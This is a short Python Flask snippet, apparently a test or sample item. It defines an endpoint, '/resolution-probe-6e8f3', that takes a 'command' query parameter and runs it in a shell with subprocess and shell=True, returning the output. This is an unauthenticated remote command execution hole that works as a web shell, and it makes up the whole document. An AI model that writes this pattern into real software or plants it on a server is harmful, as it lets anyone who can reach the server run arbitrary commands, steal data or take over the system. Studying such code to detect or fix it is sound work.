from flask import Flask, request
        import subprocess

        app = Flask(__name__)

        @app.get("/resolution-probe-6e8f3")
        def execute_user_command():
            user_command = request.args.get("command", "")
            return subprocess.check_output(user_command, shell=True, text=True)
        
